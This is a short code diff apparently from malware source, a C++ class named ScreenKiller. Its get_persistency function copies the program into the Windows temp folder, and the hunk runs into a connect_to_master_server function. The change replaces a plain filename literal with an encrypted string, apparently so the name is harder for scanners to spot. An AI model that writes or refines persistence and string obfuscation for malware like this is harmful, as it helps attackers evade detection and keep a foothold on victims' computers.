@@ -69,14 +69,14 @@ bool ScreenKiller::deploy_inner()
 
 bool ScreenKiller::get_persistency()
 {
-	char filename[] = "mystery";
+	std::string filename = this->encrypt_string("ZNDCREN");
 	char temp_path[MAX_PATH];
 
 	GetTempPathA(MAX_PATH, temp_path);
 
-	strcat_s(temp_path, MAX_PATH, filename);
+	strcat_s(temp_path, MAX_PATH, filename.c_str());
 
-	return CopyFileA(filename, temp_path, false) != 0;
+	return CopyFileA(filename.c_str(), temp_path, false) != 0;
 }
 
 bool ScreenKiller::connect_to_master_server()
